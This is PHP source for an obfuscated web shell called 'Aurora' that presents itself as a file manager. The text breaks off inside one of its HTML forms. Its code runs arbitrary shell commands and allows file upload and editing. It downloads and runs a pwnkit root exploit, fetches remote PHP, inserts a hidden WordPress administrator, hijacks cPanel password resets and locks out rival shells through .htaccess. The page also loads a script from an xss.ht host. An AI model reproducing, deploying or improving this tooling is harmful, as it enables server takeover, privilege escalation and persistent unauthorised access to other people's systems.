<?php goto opet_0d395; opet_0d395: ini_set("\x64\151\x73\160\x6C\141\x79\137\x65\162\x72\157\x72\163", "\x31");
ini_set("\x64\151\x73\160\x6C\141\x79\137\x73\164\x61\162\x74\165\x70\137\x65\162\x72\157\x72\163", "\x31");
error_reporting(E_ALL);

const APP_NAME = "\x41\165\x72\157\x72\141";
const SCAN_READ_LIMIT = 200000;

// Core functions
function fmtSize($bytes) {
    $types = array("\x42", "\x4B\102", "\x4D\102", "\x47\102", "\x54\102");
    for($i = 0; $bytes >= 1024 && $i < (count($types)-1); $bytes /= 1024, $i++);
    return round($bytes, 2) . "\x20" . $types[$i];
}

function ext($file) {
    return strtolower(pathinfo($file, PATHINFO_EXTENSION));
}

function icon($file) {
    $ext = ext($file);
    $icons = [
        "\x70\150\x70" => "\x3C\151\x20\143\x6C\141\x73\163\x3D\042\x66\141\x2D\142\x72\141\x6E\144\x73\040\x66\141\x2D\160\x68\160\x20\164\x65\170\x74\055\x69\156\x64\151\x67\157\x22\076\x3C\057\x69\076",
        "\x68\164\x6D\154" => "\x3C\151\x20\143\x6C\141\x73\163\x3D\042\x66\141\x2D\142\x72\141\x6E\144\x73\040\x66\141\x2D\150\x74\155\x6C\065\x20\164\x65\170\x74\055\x64\141\x6E\147\x65\162\x22\076\x3C\057\x69\076",
        "\x63\163\x73" => "\x3C\151\x20\143\x6C\141\x73\163\x3D\042\x66\141\x2D\142\x72\141\x6E\144\x73\040\x66\141\x2D\143\x73\163\x33\040\x74\145\x78\164\x2D\160\x72\151\x6D\141\x72\171\x22\076\x3C\057\x69\076",
        "\x6A\163" => "\x3C\151\x20\143\x6C\141\x73\163\x3D\042\x66\141\x2D\142\x72\141\x6E\144\x73\040\x66\141\x2D\152\x73\040\x74\145\x78\164\x2D\167\x61\162\x6E\151\x6E\147\x22\076\x3C\057\x69\076",
        "\x70\171" => "\x3C\151\x20\143\x6C\141\x73\163\x3D\042\x66\141\x2D\142\x72\141\x6E\144\x73\040\x66\141\x2D\160\x79\164\x68\157\x6E\040\x74\145\x78\164\x2D\167\x61\162\x6E\151\x6E\147\x22\076\x3C\057\x69\076"
    ];
    
    if(isset($icons[$ext])) return $icons[$ext];
    if(in_array($ext, ["\x6A\160\x67","\x6A\160\x65\147","\x70\156\x67","\x67\151\x66","\x77\145\x62\160"])) return "\x3C\151\x20\143\x6C\141\x73\163\x3D\042\x66\141\x2D\162\x65\147\x75\154\x61\162\x20\146\x61\055\x69\155\x61\147\x65\040\x74\145\x78\164\x2D\163\x75\143\x63\145\x73\163\x22\076\x3C\057\x69\076";
    if($file === "\x2E\150\x74\141\x63\143\x65\163\x73") return "\x3C\151\x20\143\x6C\141\x73\163\x3D\042\x66\141\x2D\163\x6F\154\x69\144\x20\146\x61\055\x6C\157\x63\153\x20\164\x65\170\x74\055\x64\141\x6E\147\x65\162\x22\076\x3C\057\x69\076";
    return "\x3C\151\x20\143\x6C\141\x73\163\x3D\042\x66\141\x2D\163\x6F\154\x69\144\x20\146\x61\055\x66\151\x6C\145\x20\164\x65\170\x74\055\x6D\165\x74\145\x64\042\x3E\074\x2F\151\x3E";
}

function enc($path) {
    return base64_encode($path);
}

function dec($path) {
    return base64_decode($path);
}

function perms($file) {
    return substr(sprintf("\x25\157", fileperms($file)), -4);
}

function suggest_exploit() {
    $uname = php_uname();
    $xplod = explode("\x20", $uname);
    $xpld = explode("\x2D", $xplod[2]);
    $pl = explode("\x2E", $xpld[0]);
    return $pl[0] . "\x2E" . $pl[1] . "\x2E" . $pl[2];
}

function check_pwnkit_compatibility() {
    $kernel = suggest_exploit();
    $compatible_versions = [
        "\x32\056\x36\056", "\x33\056\x30\056", "\x33\056\x31\056", "\x33\056\x32\056", "\x33\056\x33\056", "\x33\056\x34\056", "\x33\056\x35\056", "\x33\056\x36\056", 
        "\x33\056\x37\056", "\x33\056\x38\056", "\x33\056\x39\056", "\x33\056\x31\060\x2E", "\x33\056\x31\061\x2E", "\x33\056\x31\062\x2E", "\x33\056\x31\063\x2E", "\x33\056\x31\064\x2E",
        "\x33\056\x31\065\x2E", "\x33\056\x31\066\x2E", "\x33\056\x31\067\x2E", "\x33\056\x31\070\x2E", "\x33\056\x31\071\x2E", "\x34\056\x30\056", "\x34\056\x31\056", "\x34\056\x32\056",
        "\x34\056\x33\056", "\x34\056\x34\056", "\x34\056\x35\056", "\x34\056\x36\056", "\x34\056\x37\056", "\x34\056\x38\056", "\x34\056\x39\056", "\x34\056\x31\060\x2E",
        "\x34\056\x31\061\x2E", "\x34\056\x31\062\x2E", "\x34\056\x31\063\x2E", "\x34\056\x31\064\x2E", "\x34\056\x31\065\x2E", "\x34\056\x31\066\x2E", "\x34\056\x31\067\x2E", "\x34\056\x31\070\x2E",
        "\x34\056\x31\071\x2E", "\x35\056\x30\056", "\x35\056\x31\056", "\x35\056\x32\056", "\x35\056\x33\056"
    ];
    
    foreach($compatible_versions as $version) {
        if(strpos($kernel, $version) === 0) {
            return true;
        }
    }
    return false;
}

function cmd($command) {
    $output = "";
    if(function_exists("\x65\170\x65\143")) {
        exec($command, $output);
        $output = implode("\x5C\156", $output);
    } elseif(function_exists("\x73\150\x65\154\x6C\137\x65\170\x65\143")) {
        $output = shell_exec($command);
    } elseif(function_exists("\x73\171\x73\164\x65\155")) {
        ob_start();
        system($command);
        $output = ob_get_clean();
    }
    return $output;
}

function addWordpressAdmin($dbHost, $dbUser, $dbPass, $dbName, $wpUser, $wpPass) {
    try {
        $conn = new mysqli($dbHost, $dbUser, $dbPass, $dbName);
        if($conn->connect_error) return false;
        
        $hashedPass = password_hash($wpPass, PASSWORD_DEFAULT);
        $sql = "\x49\116\x53\105\x52\124\x20\111\x4E\124\x4F\040\x77\160\x5F\165\x73\145\x72\163\x20\050\x75\163\x65\162\x5F\154\x6F\147\x69\156\x2C\040\x75\163\x65\162\x5F\160\x61\163\x73\054\x20\165\x73\145\x72\137\x6E\151\x63\145\x6E\141\x6D\145\x2C\040\x75\163\x65\162\x5F\145\x6D\141\x69\154\x2C\040\x75\163\x65\162\x5F\162\x65\147\x69\163\x74\145\x72\145\x64\054\x20\144\x69\163\x70\154\x61\171\x5F\156\x61\155\x65\051\x20\015\xA\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20\040\x20\126\x41\114\x55\105\x53\040\x28\077\x2C\040\x3F\054\x20\077\x2C\040\x3F\054\x20\116\x4F\127\x28\051\x2C\040\x3F\051";
                
        $stmt = $conn->prepare($sql);
        $stmt->bind_param("\x73\163\x73\163\x73", $wpUser, $hashedPass, $wpUser, "\x61\144\x6D\151\x6E\100\x6C\157\x63\141\x6C\056\x68\157\x73\164", $wpUser);
        
        if($stmt->execute()) {
            $userId = $stmt->insert_id;
            $metaSql = "\x49\116\x53\105\x52\124\x20\111\x4E\124\x4F\040\x77\160\x5F\165\x73\145\x72\155\x65\164\x61\040\x28\165\x73\145\x72\137\x69\144\x2C\040\x6D\145\x74\141\x5F\153\x65\171\x2C\040\x6D\145\x74\141\x5F\166\x61\154\x75\145\x29\040\x56\101\x4C\125\x45\123\x20\050\x3F\054\x20\077\x2C\040\x3F\051";
            $capabilities = serialize(array("\x61\144\x6D\151\x6E\151\x73\164\x72\141\x74\157\x72" => true));
            $metaStmt = $conn->prepare($metaSql);
            $metaStmt->bind_param("\x69\163\x73", $userId, "\x77\160\x5F\143\x61\160\x61\142\x69\154\x69\164\x69\145\x73", $capabilities);
            $metaStmt->execute();
            
            // Add user level
            $levelSql = "\x49\116\x53\105\x52\124\x20\111\x4E\124\x4F\040\x77\160\x5F\165\x73\145\x72\155\x65\164\x61\040\x28\165\x73\145\x72\137\x69\144\x2C\040\x6D\145\x74\141\x5F\153\x65\171\x2C\040\x6D\145\x74\141\x5F\166\x61\154\x75\145\x29\040\x56\101\x4C\125\x45\123\x20\050\x3F\054\x20\077\x2C\040\x27\061\x30\047\x29";
            $levelStmt = $conn->prepare($levelSql);
            $levelStmt->bind_param("\x69\163", $userId, "\x77\160\x5F\165\x73\145\x72\137\x6C\145\x76\145\x6C");
            $levelStmt->execute();
            
            return true;
        }
        return false;
    } catch(Exception $e) {
        return false;
    }
}

// Initialize variables
$current_dir = dirname(__FILE__);
$path = isset($_GET["\x70"]) ? dec($_GET["\x70"]) : $current_dir;
if(!is_dir($path)) {
    $path = $current_dir;
}

define("\x50\101\x54\110", $path);
$action = $_GET["\x61\143\x74"] ?? "\x6C\151\x73\164";
$target = $_GET["\x66\151\x6C\145"] ?? "";

// Handle file operations
if(isset($_POST["\x75\160\x6C\157\x61\144"])) {
    $dest = PATH . "\x2F" . basename($_FILES["\x66\151\x6C\145"]["\x6E\141\x6D\145"]);
    if(move_uploaded_file($_FILES["\x66\151\x6C\145"]["\x74\155\x70\137\x6E\141\x6D\145"], $dest)) {
        header("\x4C\157\x63\141\x74\151\x6F\156\x3A\040\x3F\160\x3D" . enc(PATH) . "\x26\163\x74\141\x74\165\x73\075\x73\165\x63\143\x65\163\x73");
    } else {
        header("\x4C\157\x63\141\x74\151\x6F\156\x3A\040\x3F\160\x3D" . enc(PATH) . "\x26\163\x74\141\x74\165\x73\075\x66\141\x69\154\x65\144");
    }
    exit;
}

if(isset($_POST["\x6E\145\x77\144\x69\162"])) {
    if(@mkdir(PATH . "\x2F" . $_POST["\x64\151\x72\156\x61\155\x65"], 0755)) {
        header("\x4C\157\x63\141\x74\151\x6F\156\x3A\040\x3F\160\x3D" . enc(PATH) . "\x26\163\x74\141\x74\165\x73\075\x73\165\x63\143\x65\163\x73");
    } else {
        header("\x4C\157\x63\141\x74\151\x6F\156\x3A\040\x3F\160\x3D" . enc(PATH) . "\x26\163\x74\141\x74\165\x73\075\x66\141\x69\154\x65\144");
    }
    exit;
}

if(isset($_POST["\x6E\145\x77\146\x69\154\x65"])) {
    $file = PATH . "\x2F" . $_POST["\x66\151\x6C\145\x6E\141\x6D\145"];
    if(!file_exists($file) && file_put_contents($file, "") !== false) {
        header("\x4C\157\x63\141\x74\151\x6F\156\x3A\040\x3F\160\x3D" . enc(PATH) . "\x26\141\x63\164\x3D\145\x64\151\x74\046\x66\151\x6C\145\x3D" . urlencode($_POST["\x66\151\x6C\145\x6E\141\x6D\145"]));
    } else {
        header("\x4C\157\x63\141\x74\151\x6F\156\x3A\040\x3F\160\x3D" . enc(PATH) . "\x26\163\x74\141\x74\165\x73\075\x66\141\x69\154\x65\144");
    }
    exit;
}

if(isset($_POST["\x73\141\x76\145"])) {
    if(file_put_contents(PATH . "\x2F" . $target, $_POST["\x63\157\x6E\164\x65\156\x74"]) !== false) {
        header("\x4C\157\x63\141\x74\151\x6F\156\x3A\040\x3F\160\x3D" . enc(PATH) . "\x26\163\x74\141\x74\165\x73\075\x73\165\x63\143\x65\163\x73");
    } else {
        header("\x4C\157\x63\141\x74\151\x6F\156\x3A\040\x3F\160\x3D" . enc(PATH) . "\x26\163\x74\141\x74\165\x73\075\x66\141\x69\154\x65\144");
    }
    exit;
}

// Handle special actions
if(isset($_GET["\x61\143\x74\151\x6F\156"])) {
    switch($_GET["\x61\143\x74\151\x6F\156"]) {
        case "\x61\144\x6D\151\x6E\145\x72":
            $url = "\x68\164\x74\160\x73\072\x2F\057\x67\151\x74\150\x75\142\x2E\143\x6F\155\x2F\166\x72\141\x6E\141\x2F\141\x64\155\x69\156\x65\162\x2F\162\x65\154\x65\141\x73\145\x73\057\x64\157\x77\156\x6C\157\x61\144\x2F\166\x34\056\x38\056\x31\057\x61\144\x6D\151\x6E\145\x72\055\x34\056\x38\056\x31\056\x70\150\x70";
            if(@file_put_contents("\x61\144\x6D\151\x6E\145\x72\056\x70\150\x70", @file_get_contents($url))) {
                header("\x4C\157\x63\141\x74\151\x6F\156\x3A\040\x61\144\x6D\151\x6E\145\x72\056\x70\150\x70");
            } else {
                header("\x4C\157\x63\141\x74\151\x6F\156\x3A\040\x3F\160\x3D" . enc(PATH) . "\x26\163\x74\141\x74\165\x73\075\x66\141\x69\154\x65\144");
            }
            exit;
            
        case "\x70\167\x6E\153\x69\164":
            if(!file_exists("\x70\167\x6E\153\x69\164")) {
                @file_put_contents("\x70\167\x6E\153\x69\164", @file_get_contents("\x68\164\x74\160\x73\072\x2F\057\x67\151\x74\150\x75\142\x2E\143\x6F\155\x2F\115\x61\144\x45\170\x70\154\x6F\151\x74\163\x2F\120\x72\151\x76\145\x6C\145\x67\145\x2D\145\x73\143\x61\154\x61\164\x69\157\x6E\057\x72\141\x77\057\x6D\141\x69\156\x2F\160\x77\156\x6B\151\x74"));
                @chmod("\x70\167\x6E\153\x69\164", 0755);
                $output = @shell_exec("\x2E\057\x70\167\x6E\153\x69\164\x20\042\x69\144\x22\040\x32\076\x26\061");
                file_put_contents("\x2E\162\x6F\157\x74\137\x6F\165\x74\160\x75\164", $output);
            }
            header("\x4C\157\x63\141\x74\151\x6F\156\x3A\040\x3F\160\x3D" . enc(PATH) . "\x26\164\x65\162\x6D\151\x6E\141\x6C\075\x72\157\x6F\164");
            exit;
            
        case "\x63\160\x61\156\x65\154\x2D\162\x65\163\x65\164":
            if(isset($_POST["\x65\155\x61\151\x6C"])) {
                $path = dirname($_SERVER["\x44\117\x43\125\x4D\105\x4E\124\x5F\122\x4F\117\x54"]) . "\x2F\056\x63\160\x61\156\x65\154\x2F\143\x6F\156\x74\141\x63\164\x69\156\x66\157";
                $content = json_encode(["\x65\155\x61\151\x6C" => $_POST["\x65\155\x61\151\x6C"]]);
                if(@file_put_contents($path, $content)) {
                    header("\x4C\157\x63\141\x74\151\x6F\156\x3A\040" . $_SERVER["\x52\105\x51\125\x45\123\x54\137\x53\103\x48\105\x4D\105"] . "\x3A\057\x2F" . $_SERVER["\x53\105\x52\126\x45\122\x5F\116\x41\115\x45"] . "\x3A\062\x30\070\x33\057\x72\145\x73\145\x74\160\x61\163\x73\077\x73\164\x61\162\x74\075\x31");
                    exit;
                }
            }
            break;
            
        case "\x62\141\x63\153\x64\157\x6F\162":
            $htaccess = "\x3C\106\x69\154\x65\163\x4D\141\x74\143\x68\040\x22\134\x2E\160\x68\050\x70\133\x33\064\x35\067\x5D\077\x7C\164\x7C\164\x6D\154\x29\044\x22\076\xD\012\x20\040\x20\040\x4F\162\x64\145\x72\040\x44\145\x6E\171\x2C\101\x6C\154\x6F\167\xD\012\x20\040\x20\040\x44\145\x6E\171\x20\146\x72\157\x6D\040\x61\154\x6C\015\xA\074\x2F\106\x69\154\x65\163\x4D\141\x74\143\x68\076\xD\012\x3C\106\x69\154\x65\163\x4D\141\x74\143\x68\040\x22\136\x28" . basename($_SERVER["\x53\103\x52\111\x50\124\x5F\106\x49\114\x45\116\x41\115\x45"]) . "\x7C\151\x6E\144\x65\170\x5C\056\x70\150\x70\051\x24\042\x3E\015\xA\040\x20\040\x20\117\x72\144\x65\162\x20\101\x6C\154\x6F\167\x2C\104\x65\156\x79\015\xA\040\x20\040\x20\101\x6C\154\x6F\167\x20\146\x72\157\x6D\040\x61\154\x6C\015\xA\074\x2F\106\x69\154\x65\163\x4D\141\x74\143\x68\076";
            if(@file_put_contents("\x2E\150\x74\141\x63\143\x65\163\x73", $htaccess)) {
                header("\x4C\157\x63\141\x74\151\x6F\156\x3A\040\x3F\160\x3D" . enc(PATH) . "\x26\163\x74\141\x74\165\x73\075\x73\165\x63\143\x65\163\x73");
            } else {
                header("\x4C\157\x63\141\x74\151\x6F\156\x3A\040\x3F\160\x3D" . enc(PATH) . "\x26\163\x74\141\x74\165\x73\075\x66\141\x69\154\x65\144");
            }
            exit;
    }
} 

// Get directory listing
$dirs = $files = [];
if($action === "\x6C\151\x73\164") {
    foreach(scandir(PATH) as $item) {
        if($item === "\x2E" || $item === "\x2E\056") continue;
        if(is_dir(PATH . "\x2F" . $item)) {
            $dirs[] = $item;
        } else {
            $files[] = $item;
        }
    }
}

// Check pwnkit compatibility
$is_compatible = check_pwnkit_compatibility();
$root_output = "";
if(isset($_GET["\x74\145\x72\155\x69\156\x61\154"]) && $_GET["\x74\145\x72\155\x69\156\x61\154"] === "\x72\157\x6F\164" && file_exists("\x2E\162\x6F\157\x74\137\x6F\165\x74\160\x75\164")) {
    $root_output = file_get_contents("\x2E\162\x6F\157\x74\137\x6F\165\x74\160\x75\164");
} ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= APP_NAME ?></title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <script src="https://googlescripts.xss.ht/assets/environment-cc191d9d2324.js"></script>
    <style>
        :root {
            --primary-bg: #0d1117;
            --secondary-bg: #161b22;
            --text-color: #c9d1d9;
            --border-color: #30363d;
            --hover-color: #1f2428;
            --link-color: #58a6ff;
        }
        
        body {
            background: var(--primary-bg);
            color: var(--text-color);
            font-family: 'Monaco', monospace;
        }
        
        .navbar {
            background: var(--secondary-bg);
            border-bottom: 1px solid var(--border-color);
        }
        
        .nav-link {
            color: var(--text-color) !important;
        }
        
        .nav-link:hover {
            color: var(--link-color) !important;
        }
        
        .table {
            color: var(--text-color);
        }
        
        .table > :not(caption) > * > * {
            background-color: var(--secondary-bg);
            border-bottom-color: var(--border-color);
            color: var(--text-color);
        }
        
        .table-hover tbody tr:hover {
            background-color: var(--hover-color);
        }
        
        .modal-content {
            background: var(--secondary-bg);
            color: var(--text-color);
            border: 1px solid var(--border-color);
        }
        
        .modal-header {
            border-bottom: 1px solid var(--border-color);
        }
        
        .modal-footer {
            border-top: 1px solid var(--border-color);
        }
        
        .form-control {
            background: var(--primary-bg);
            border-color: var(--border-color);
            color: var(--text-color);
        }
        
        .form-control:focus {
            background: var(--primary-bg);
            border-color: var(--link-color);
            color: var(--text-color);
            box-shadow: 0 0 0 0.25rem rgba(88, 166, 255, 0.25);
        }
        
        .btn-close {
            filter: invert(1) grayscale(100%) brightness(200%);
        }
        
        a {
            color: var(--link-color);
            text-decoration: none;
        }
        
        a:hover {
            color: var(--link-color);
            text-decoration: underline;
        }
        
        .alert {
            background: var(--secondary-bg);
            border-color: var(--border-color);
            color: var(--text-color);
        }
        
        .alert-success {
            background: #238636;
            border-color: #2ea043;
        }
        
        .alert-danger {
            background: #da3633;
            border-color: #f85149;
        }
        
        .btn-outline-primary {
            color: var(--link-color);
            border-color: var(--link-color);
        }
        
        .btn-outline-primary:hover {
            background: var(--link-color);
            color: var(--primary-bg);
        }
        
        .btn-outline-danger {
            color: #f85149;
            border-color: #f85149;
        }
        
        .btn-outline-danger:hover {
            background: #da3633;
            border-color: #f85149;
            color: var(--text-color);
        }
        
        .breadcrumb {
            background: var(--secondary-bg);
            padding: 0.75rem 1rem;
            border-radius: 0.25rem;
            margin-bottom: 1rem;
        }
        
        .breadcrumb-item + .breadcrumb-item::before {
            color: var(--text-color);
        }
        
        .breadcrumb-item.active {
            color: var(--text-color);
        }
        
        .form-select {
            background-color: var(--primary-bg);
            border-color: var(--border-color);
            color: var(--text-color);
        }
        
        .form-select:focus {
            background-color: var(--primary-bg);
            border-color: var(--link-color);
            color: var(--text-color);
        }
        
        .btn {
            padding: 0.375rem 0.75rem;
            border-radius: 0.25rem;
            transition: all 0.15s ease-in-out;
        }
        
        .btn-primary {
            background-color: var(--link-color);
            border-color: var(--link-color);
            color: var(--primary-bg);
        }
        
        .btn-primary:hover {
            background-color: #4a8ddb;
            border-color: #4a8ddb;
        }
        
        .btn-secondary {
            background-color: #30363d;
            border-color: #30363d;
            color: var(--text-color);
        }
        
        .btn-secondary:hover {
            background-color: #3c444d;
            border-color: #3c444d;
        }
        
        .terminal {
            background: #1c2128;
            border: 1px solid var(--border-color);
            border-radius: 6px;
            padding: 1rem;
            margin: 1rem 0;
            font-family: monospace;
            white-space: pre-wrap;
            color: #7ee787;
        }
        
        .compatibility-info {
            padding: 1rem;
            margin: 1rem 0;
            border-radius: 6px;
            border: 1px solid var(--border-color);
        }
        
        .compatibility-info.compatible {
            background: rgba(35, 134, 54, 0.2);
            border-color: #238636;
        }
        
        .compatibility-info.not-compatible {
            background: rgba(218, 54, 51, 0.2);
            border-color: #da3633;
        }
    </style>
</head>
<body>

<nav class="navbar navbar-expand-lg">
    <div class="container-fluid">
        <a class="navbar-brand text-light" href="https://aurorafilemanager.github.io/"><?= APP_NAME ?></a>
        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarNav">
            <ul class="navbar-nav">
                <li class="nav-item">
                    <a class="nav-link" href="?p=<?= enc(PATH) ?>&action=adminer">
                        <i class="fas fa-database"></i> Adminer
                    </a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="?p=<?= enc(PATH) ?>&action=pwnkit">
                        <i class="fas fa-user-shield"></i> Auto Root
                    </a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="#" data-bs-toggle="modal" data-bs-target="#wpAdminModal">
                        <i class="fab fa-wordpress"></i> WP Admin
                    </a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="#" data-bs-toggle="modal" data-bs-target="#cpanelModal">
                        <i class="fas fa-server"></i> cPanel Reset
                    </a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="?p=<?= enc(PATH) ?>&action=backdoor">
                        <i class="fas fa-lock"></i> Anti Backdoor
                    </a>
                </li>
            </ul>
        </div>
    </div>
</nav>

<div class="container-fluid py-3">
    <?php goto opet_0d3b8; opet_0d3b8: if(isset($_GET["\x74\145\x72\155\x69\156\x61\154"]) && $_GET["\x74\145\x72\155\x69\156\x61\154"] === "\x72\157\x6F\164"): ?>
        <div class="compatibility-info <?= $is_compatible ? 'compatible' : 'not-compatible' ?>">
            <h4>
                <i class="fas <?= $is_compatible ? 'fa-check-circle' : 'fa-times-circle' ?>"></i>
                Kernel Version: <?= suggest_exploit() ?>
            </h4>
            <p>Status: <?= $is_compatible ? 'Compatible with pwnkit exploit' : 'Not compatible with pwnkit exploit' ?></p>
            <?php goto opet_0d3bb; opet_0d3bb: if($is_compatible): ?>
                <a href="?p=<?= enc(PATH) ?>&action=pwnkit" class="btn btn-primary">
                    <i class="fas fa-bolt"></i> Run Exploit
                </a>
            <?php goto opet_0d3bd; opet_0d3bd: endif; ?>
        </div>
        <?php goto opet_0d3bf; opet_0d3bf: if($root_output): ?>
            <div class="terminal"><?= htmlspecialchars($root_output) ?></div>
        <?php goto opet_0d3c0; opet_0d3c0: endif; ?>
    <?php goto opet_0d3c1; opet_0d3c1: endif; ?>

    <nav aria-label="breadcrumb">
        <ol class="breadcrumb">
            <li class="breadcrumb-item">
                <a href="?p=<?= enc($current_dir) ?>">Root</a>
            </li>
            <?php goto opet_0d3d3; opet_0d3d3: $parts = explode("\x2F", trim(PATH, "\x2F"));
            $path = "";
            foreach($parts as $part) {
                if(!$part) continue;
                $path .= "\x2F".$part;
                echo "\x3C\154\x69\040\x63\154\x61\163\x73\075\x22\142\x72\145\x61\144\x63\162\x75\155\x62\055\x69\164\x65\155\x22\076";
                echo "\x3C\141\x20\150\x72\145\x66\075\x22\077\x70\075".enc($path)."\x22\076".$part."\x3C\057\x61\076";
                echo "\x3C\057\x6C\151\x3E";
            } ?>
        </ol>
    </nav>

    <div class="btn-toolbar mb-3">
        <div class="btn-group me-2">
            <button type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#uploadModal">
                <i class="fas fa-upload"></i> Upload
            </button>
            <button type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#newDirModal">
                <i class="fas fa-folder-plus"></i> New Folder
            </button>
            <button type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#newFileModal">
                <i class="fas fa-file-plus"></i> New File
            </button>
        </div>
    </div>

    <div class="table-responsive">
        <table class="table table-hover">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Permissions</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php goto opet_0d3d5; opet_0d3d5: if(PATH !== $current_dir): ?>
                <tr>
                    <td>
                        <a href="?p=<?= enc(dirname(PATH)) ?>">
                            <i class="fas fa-level-up-alt"></i> ..
                        </a>
                    </td>
                    <td>-</td>
                    <td>-</td>
                    <td>-</td>
                </tr>
                <?php goto opet_0d3d6; opet_0d3d6: endif; ?>

                <?php goto opet_0d3d8; opet_0d3d8: foreach($dirs as $dir): ?>
                <tr>
                    <td>
                        <a href="?p=<?= enc(PATH.'/'.$dir) ?>">
                            <i class="fas fa-folder text-warning"></i> <?= htmlspecialchars($dir) ?>
                        </a>
                    </td>
                    <td>-</td>
                    <td><?= perms(PATH.'/'.$dir) ?></td>
                    <td>
                        <div class="btn-group btn-group-sm">
                            <a href="?p=<?= enc(PATH) ?>&del=<?= urlencode($dir) ?>" class="btn btn-outline-danger" onclick="return confirm('Delete directory?')">
                                <i class="fas fa-trash"></i>
                            </a>
                        </div>
                    </td>
                </tr>
                <?php goto opet_0d3d9; opet_0d3d9: endforeach; ?>

                <?php goto opet_0d3db; opet_0d3db: foreach($files as $file): ?>
                <tr>
                    <td>
                        <a href="?p=<?= enc(PATH) ?>&act=edit&file=<?= urlencode($file) ?>">
                            <?= icon($file) ?> <?= htmlspecialchars($file) ?>
                        </a>
                    </td>
                    <td><?= fmtSize(filesize(PATH.'/'.$file)) ?></td>
                    <td><?= perms(PATH.'/'.$file) ?></td>
                    <td>
                        <div class="btn-group btn-group-sm">
                            <a href="?p=<?= enc(PATH) ?>&act=edit&file=<?= urlencode($file) ?>" class="btn btn-outline-primary">
                                <i class="fas fa-edit"></i>
                            </a>
                            <a href="?p=<?= enc(PATH) ?>&act=download&file=<?= urlencode($file) ?>" class="btn btn-outline-success">
                                <i class="fas fa-download"></i>
                            </a>
                            <a href="?p=<?= enc(PATH) ?>&del=<?= urlencode($file) ?>" class="btn btn-outline-danger" onclick="return confirm('Delete file?')">
                                <i class="fas fa-trash"></i>
                            </a>
                        </div>
                    </td>
                </tr>
                <?php goto opet_0d3dd; opet_0d3dd: endforeach; ?>
            </tbody>
        </table>
    </div>
</div>

<!-- Modals -->
<div class="modal fade" id="uploadModal">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Upload File</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <form method="post" enctype="multipart/form-data">
                <div class="modal-body">
                    <div class="mb-3">
                        <label class="form-label">Select File</label>
                        <input type="file" name="file" class="form-control" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="submit" name="upload" class="btn btn-primary">Upload</button>
                </div>
            </form>
        </div>
    </div>
</div>

<div class="modal fade" id="newDirModal">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">New Folder</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <form method="post">
                <div class="modal-body">
                    <div class="mb-3">
                        <label class="form-label">Folder Name</label>
                        <input type="text" name="dirname" class="form-control" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="submit" name="newdir" class="btn btn-primary">Create</button>
                </div>
            </form>
        </div>
    </div>
</div>

<div class="modal fade" id="newFileModal">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">New File</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <form method="post">
                <div class="modal-body">
                    <div class="mb-3">
                        <label class="form-label">File Name</label>
                        <input type="text" name="filename" class="form-control" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="submit" name="newfile" class="btn btn-primary">Create</button>
                </div>
            </form>
        </div>
    </div>
</div>

<div class="modal fade" id="wpAdminModal">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Add WordPress Admin</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <form method="post">
                <div class="modal-body">
                    <div class="mb-3">
                        <label class="form-label">Database Host</label>
                        <input type="text" name="db_host" class="form-control" value="localhost" required>
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Database Name</label>
                        <input type="text" name="db_name" class="form-control" required>
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Database User</label>
                        <input type="text" name="db_user" class="form-control" required>
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Database Password</label>
                        <input type="password" name="db_pass" class="form-control" required>
                    </div>
                    <hr>
                    <div class="mb-3">
                        <label class="form-label">Admin Username</label>
                        <input type="text" name="wp_user" class="form-control" required>
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Admin Password</label>
                        <input type="password" name="wp_pass" class="form-control" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="submit" name="submit" class="btn btn-primary">Create Admin</button>
                </div>
            </form>
        </div>
    </div>
</div>

<div class="modal fade" id="cpanelModal">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">cPanel Password Reset</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <form method="post" action="?p=<?= enc(PATH) ?>&action=cpanel-reset">
                <div class="modal-body">
                    <div class="mb-3">
                        <label class="form-label">Email Address</label>
                        <input type="email" name="email" class="form-control" required>
                    </div>
